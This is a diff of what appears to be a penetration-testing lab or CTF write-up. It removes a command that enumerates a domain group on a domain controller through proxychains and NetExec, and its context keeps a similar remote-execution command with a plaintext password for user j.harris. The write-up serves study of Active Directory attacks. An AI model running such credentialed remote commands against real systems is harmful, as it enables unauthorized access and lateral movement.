@@ -247,12 +247,7 @@ proxychains nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' -x whoam
 
 <br>
 
-I also checked the `ITSupport-Admins` group:
-
-```bash
-proxychains nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' -x "net group ITSupport-Admins /domain"
 ```
-
 You’re basically admin on the DC already via j.harris and j.harris can execute commands on the DC.
 
 For the next two questions, i tried to run:
